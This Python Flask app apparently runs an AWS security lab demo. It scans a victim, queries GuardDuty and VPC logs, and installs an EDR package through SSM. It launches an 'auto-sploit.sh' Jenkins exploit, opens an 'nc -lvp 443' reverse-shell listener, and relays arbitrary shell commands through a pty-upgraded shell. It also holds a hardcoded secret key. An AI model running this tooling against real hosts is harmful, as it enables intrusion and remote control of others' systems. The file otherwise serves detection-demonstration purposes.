import pexpect
from flask import Flask
from flask import render_template, request, jsonify, make_response
import os
import time
import logging
import requests
import json
import nmap

import boto3
import time
from datetime import datetime, timedelta

attacker_ip = os.environ['ATTACKER']
target_ip = os.environ['VICTIM']
region = os.environ['REGION']
log_group = os.environ['LOG_GROUP']

gd_events_of_interest = ['Recon:EC2/PortProbeUnprotectedPort',
                         'Recon:EC2/Portscan',
                         'CryptoCurrency:EC2/BitcoinTool.B!DNS',
                         'UnauthorizedAccess:EC2/SSHBruteForce',
                         ]


client = boto3.client('ssm', region_name=region)
ec2_client=boto3.client('ec2', region_name=region)

app = Flask(__name__)
region = "eu-west-1"
logging.basicConfig(filename='app.log', level=logging.DEBUG)
logger = logging.getLogger()


app.config['SECRET_KEY'] = 'c27e5a04065046f45a88300d80baa8cd'

@app.route("/installfalcon", methods=['POST'])

def run_install_package():
    if request.is_json:
        logger.info(request.data)
        payload = request.get_json()

        package_name = payload.get('package_name')
        action = payload.get('action')
        instance_ids = payload.get('instance_ids')
        document_name = payload.get('document_name')
    parameters = {
        'action': [action],
        'installationType': ['Uninstall and reinstall'],
        'name': [package_name]
        # 'version': ['']
    }

    try:
        response = client.send_command(
            InstanceIds=instance_ids,
            DocumentName=document_name,
            TimeoutSeconds=300,
            Comment='Install package',
            Parameters=parameters
        )
        n = 6
        while n > 0:
            if response.get('Command'):
                cmd_status = client.list_commands(CommandId=response['Command']['CommandId'])
                cmd_status = cmd_status['Commands'][0]['Status']
                if cmd_status == 'Pending' or cmd_status == 'InProgress':
                    time.sleep(5)
                    # Wait up to 30 secs for response
                    n -= 1
                else:
                    break

        if cmd_status == 'Success':
            msg = "Action: " + action + " Falcon: Success"
        else:
            msg = "Action: " + action + " Falcon: Failure"
        data = {"Result": msg}
        res = make_response(jsonify(
            data), 200)
        res.headers['Content-type'] = 'application/json'
    except Exception as e:
        print('Got Exception {}'.format(e))
        data = {"Result": "Request format not json"}
    res = make_response(jsonify(
        data), 200)
    res.headers['Content-type'] = 'application/json'
    return res


@app.route("/vpclogs", methods=['POST'])
def query_vpc_logs():
    _flow_logs = []
    if request.is_json:
        logger.info(request.data)
        payload = request.get_json()
        time_interval=payload.get('time_interval', '')
        time_value=float(payload.get('time_value',''))
        log_group_name=payload.get('log_group_name', '')
        query_string=payload.get('query_string', '')

        if time_interval == "hours":
            last_time = int((datetime.today() - timedelta(hours=float(time_value))).timestamp())
        elif time_interval == "minutes":
            last_time = int((datetime.today() - timedelta(minutes=float(time_value))).timestamp())
        elif time_interval == "seconds":
            last_time = int((datetime.today() - timedelta(seconds=float(time_value))).timestamp())
        else:
            last_time = int((datetime.today() - timedelta(days=float(time_value))).timestamp())
        print('last_time is {}'.format(last_time))
        client = boto3.client('logs', region_name=region, verify=None)
        try:
            query = client.start_query(
                logGroupName=log_group_name,
                queryString=query_string,
                startTime=int(datetime.today().timestamp()) - last_time,
                endTime=int(datetime.now().timestamp()),
                limit=5
            )
            while check_for_running_queries(log_group_name):
                time.sleep(2)
                _response = client.get_query_results(queryId=query['queryId'])
                for _result in _response.get("results"):
                    _flow_logs.append(_result[1]["value"])
                _flow_log_dict = {"logs": _flow_logs}
        except Exception as e:
            print('Got Exception {}'.format(e))
            print(query['queryId'])
    else:
        _flow_log_dict = {"logs": "unexpected-request-format"}
    res = make_response(jsonify(
        _flow_log_dict), 200)
    res.headers['Content-type'] = 'application/json'
    return res


@app.route("/", methods=['GET'])
def home():
    if request.method == 'GET':
        return render_template('routing/index.html')


@app.route("/labinfra", methods=['GET'])
def labinfra():
    if request.method == 'GET':
        return render_template('routing/labinfra.html')


@app.route("/awssec", methods=['GET'])
def awssec_info():
    if request.method == 'GET':
        return render_template('routing/awssec.html')


@app.route("/vulnerability", methods=['GET'])
def vulnerability_info():
    if request.method == 'GET':
        return render_template('routing/vulnerability.html')


@app.route("/nmap", methods=['POST'])
def nmap_host():
    if request.method == 'POST':
        # target_ip = request.form.get('target')
        try:
            nm = nmap.PortScanner()
            scan_res = nm.scan(target_ip, arguments='-Pn -p80,443')
            result = {"Success":scan_res}
        except Exception as e:
            result={"Error":"nmap scan failed"}

        res = make_response(jsonify(
            result), 200)
        res.headers['Content-type'] = 'application/json'
        return res


@app.route("/gdquery", methods=['POST'])
def query_gd():
    if request.method == 'POST':
        if request.is_json:
            logger.info(request.data)
            payload = request.get_json()
        events_of_interest = payload.get('events_of_interest')

        gd_client = boto3.client('guardduty', region_name=region)

        # Find out if GuardDuty already enabled:
        detectors_list = gd_client.list_detectors()

        if not detectors_list["DetectorIds"]:
            print("GuardDuty is not enabled ... enabling GuardDuty on master account")
            response = gd_client.create_detector(Enable=True);
            # Save DetectorID handler
            DetectorId = response["DetectorId"]
        else:
            print("GuardDuty already enabled on account")
            DetectorId = detectors_list['DetectorIds'][0]

        # print all Detectorts
        print("Detector lists: ")
        for x in detectors_list["DetectorIds"]:
            print(x, end=" ")

        gd_findings = gd_client.list_findings(
            DetectorId=DetectorId
        )

        # print all findings
        _print_finding = lambda DetectorId, FindingId: gd_client.get_findings(
            DetectorId=DetectorId,
            FindingIds=[
                FindingId,
            ]
        )

        # keep findinds in a buffer - in case we'd like to do text manipulation later on
        findings_buffer = []
        # Print all findings in JSON format
        for _find in gd_findings['FindingIds']:
            _find = (_print_finding(DetectorId, _find))
            if _find['Findings'][0]['Type'] in events_of_interest:
                findings_buffer.append(_find['Findings'][0])

        # print to terminal (comment out this line if the list is too long, use text file instead)
        results = {"results": findings_buffer}

        # print the count of findings for the given severity.
        res = make_response(jsonify(
            results), 200)
        res.headers['Content-type'] = 'application/json'
        print(res)
        return res


@app.route("/headers", methods=['POST'])
def http_headers():
    logger.info(request.data)
    payload = request.get_json()
    print(payload)
    print(type(payload))
    # target_ip = payload.get('target', '')
    # attacker_ip = payload.get('attacker', '')
    # target_ip = request.form.get('target')
    response = requests.get('http://'+target_ip)
    headers_dict = {}
    print(response)
    ignore_headers = ["Cache-Control","Date","Expires"]
    for k, v in response.headers.items():
        if k in ignore_headers:
            logger.info('Ignoring header {}'.format(k))
        else:
            headers_dict[k] = v
            # print('{}:{}'.format(k, v))

    res = make_response(jsonify(
        headers_dict), 200)
    res.headers['Content-type'] = 'application/json'
    print(res)
    return res


@app.route("/test", methods=['GET'])
def display_test():
    managed_instances = get_managed_instances()
    return render_template('routing/test.html', managed_instances=managed_instances)


@app.route("/phase2", methods=['GET'])
def launch_phase2():
    if request.method == 'GET':
        managed_instances = get_managed_instances()
        return render_template('routing/phase2.html', log_group=log_group, attacker_ip=attacker_ip,
                               managed_instances=managed_instances, gd_events_of_interest=gd_events_of_interest)


@app.route("/launch", methods=['GET', 'POST'])
def launch_phase1():
    """
    Accepts a JSON payload with the following structure:
    {
        "target": "nlb-something.fqdn.com",
        "attacker": "1.2.3.4"
    }
    If the payload parses correctly, then launch a reverse shell listener using pexpect.spawn
    then spawn the auto-sploit.sh tool and enter the target and attacker info again using pexpect
    :return: Simple String response for now
    """

    managed_instances = get_managed_instances()

    if request.method == 'GET':
        return render_template('routing/phase1.html', log_group=log_group, attacker_ip=attacker_ip,
                               managed_instances=managed_instances, gd_events_of_interest=gd_events_of_interest, target_ip=target_ip)

    if request.method == 'POST':
        language = request.form.get('attackerIp')

        # if request.is_json:
        #     logger.info(request.data)
        #     payload = request.get_json()
        #     print(payload)
        #     print(type(payload))
        #     target_ip = payload.get('target', '')
        #     attacker_ip = payload.get('attacker', '')
        # else:
        #     target_ip = request.form.get('target')
        #     attacker_ip = request.form.get('attacker')
        logger.info('Attacker is {} and Victim is {}'.format(attacker_ip, target_ip))
        print('Attacker is {} and Victim is {}'.format(attacker_ip, target_ip))
        if target_ip == "" or attacker_ip == "":
            logger.info('Incorrect Json format!')
            print(request.payload)
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message": "ERROR - Incorrect Json format"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res

        exe = '/root/auto-sploit.sh'
        if not os.path.exists(exe):
            return make_response(jsonify({"message": "Cant find auto-sploit.sh"}), 200)
        logger.info('Launching auto-sploit.sh')
        child = pexpect.spawn(exe)
        child.delaybeforesend = 2
        found_index = child.expect(['press any key to continue', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            logger.info('launching listener process')
            _launch_listener()
            child.send('\n')
        else:
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message": "ERROR - Could not press key to continue"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res
            # return 'ERROR - Could not press key to continue'
        found_index = child.expect(['Enter Attacker IP Address', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            logger.info('Sending attacker ip :::' + attacker_ip + ':::')
            child.sendline(attacker_ip)
        else:
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message":"ERROR - Could not enter attacker IP"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res
            # return 'ERROR - Could not enter attacker IP'
        found_index = child.expect(['Enter Jenkins Target IP Address', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            logger.info(child.before)
            logger.info('Sending target ip')
            child.sendline(target_ip)
        else:
            logger.info(child.before)
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message":"ERROR - Could not enter jenkins IP"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res
            # return 'ERROR - Could not enter jenkins IP'
        found_index = child.expect(['pwn', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            logger.info('PWN')
            logger.info(child)
            time.sleep(2)
            res = make_response(jsonify(
                {
                    "result": "success",
                    "message":"SUCCESS - auto-sploit launched!"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res
            # return 'SUCCESS - auto-sploit launched!'


@app.route("/investigate", methods=['GET'])
def get_exploit_db():

    data = 'Source: https://blogs.securiteam.com/index.php/archives/3171\n\n' \
           'Vulnerability Details\n\n' \
           'Jenkins is vulnerable to a Java deserialization vulnerability. \n' \
           'In order to trigger the vulnerability two requests need to be sent.\n' \
           'The vulnerability can be found in the implementation of a bidirectional communication channel \n' \
           '(over HTTP) which accepts commands. The first request starts a session for the bi-directional \n' \
           'channel and is used for “downloading” data from the server. The HTTP header “Session” is the \n' \
           'identifier for the channel. \n\n' \
           'The HTTP header “Side” specifies the “downloading/uploading” direction. The second request is the \n' \
           'sending component of the bidirectional channel. The first requests is blocked until the second \n' \
           'request is sent. The request for a bidirectional channel is matched by the “Session” HTTP header \n' \
           ' which is just a UUID.\n\n' \
           'Proof of Concept\n\n' \
           'In order to exploit the vulnerability, an attacker needs to create a serialized payload with \nthe command' \
           'to execute by running the payload.jar script. The second step is to change python script \n' \
           'jenkins_poc1.py: \n\t- Adjust target url in URL variable\n\t' \
           '- Change file to open in line \n\t“FILE_SER = open(“jenkins_poc1.ser”, “rb”).read()” to your payload file.' \
           '\n\n' \
           'https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41965.zip'

    res = make_response(data)
    res.headers['Content-type'] = 'text/plain'
    return res



@app.route("/send", methods=['POST'])
def send_cmd():

    if request.method == 'POST':
        if request.is_json:
            data = request.get_json()
            logger.info('Got request data {}'.format(data))

            cli = data.get('cli', '')
            if cli == '':
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message":"No command in payload"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res

        if 'listener' in app.config:
            logger.info('We have a listener already up!')
            listener = app.config.get('listener', '')
            if not hasattr(listener, 'isalive') or not listener.isalive():
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "No Listener active"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res

            logger.info('Sending initial command to see where we are!')
            listener.sendline('echo $SHLVL\n')
            found_index = listener.expect(['1', 'jenkins@', 'root@', pexpect.EOF, pexpect.TIMEOUT])
            logger.info('Found index after sending echo is now: ' + str(found_index))
            if found_index == 0:
                # no prompt yet
                logger.info('We have a connection sending python -c import pty......')
                listener.sendline("python -c 'import pty; pty.spawn(\"/bin/bash\")'")
            elif found_index > 2:
                logger.info('Could not understand the response to echo got EOF {}'.format(listener.before))
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "Listener connection error"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res
            found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
            logger.info('Found index is now: ' + str(found_index))
            if found_index > 1:
                logger.info(listener)
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "Listener connection error"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res
            listener.sendline(cli)
            found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
            logger.info('Found index after cli is now: ' + str(found_index))
            if found_index > 1:
                print(listener)
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "sent cli cmd but didnt get the expected response"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res
            else:
                logger.info('response looks good')
                res = make_response(listener.before)
                res.headers['Content-type'] = 'text/plain'
                return res

        else:
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message": "No Listener in app.config"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res

    else:
        res = make_response(jsonify(
            {
                "result": "error",
                "message": "Invalid method"
            }), 200)
        res.headers['Content-type'] = 'application/json'
        return res


def _launch_listener():
    if 'listener' not in app.config:
        listener = pexpect.spawn('nc -lvp 443')
        fout = open("LOG.TXT", "wb")
        listener.logfile_read = fout
        found_index = listener.expect(['listening', pexpect.EOF, pexpect.TIMEOUT])
        if found_index != 0:
            return False
        app.config['listener'] = listener
        print('Listener ready')
        return True
    else:
        listener = app.config['listener']
        if hasattr(listener, 'isalive') and listener.isalive():
            return True
        else:
            listener = pexpect.spawn('nc -lvp 443')
            found_index = listener.expect(['listening', pexpect.EOF, pexpect.TIMEOUT])
            if found_index != 0:
                return False
            app.config['listener'] = listener
            return True


def check_for_running_queries(log_group_name):
    logs_client = boto3.client('logs', region_name=region, verify=None)
    res = logs_client.describe_queries(
        logGroupName=log_group_name,
        status='Running')
    if not res["queries"]:
        return False
    else:
        return True


def get_managed_instances():
    # Return list of dicts
    managed_instance_list = []
    filter_online = [{'Key': 'PingStatus', 'Values': ['Online', ]}, ]
    filter_crwd_managed = [{'Key': 'tag-key', 'Values': ['CRWD_MANAGED']}, ]
    response = client.describe_instance_information(Filters=filter_online)
    if response.get('InstanceInformationList'):
        for instance in response['InstanceInformationList']:
            # managed_instance_list.append({instance['InstanceId']: instance['ComputerName']})
            managed_instance_list.append(instance['InstanceId'])
    return managed_instance_list
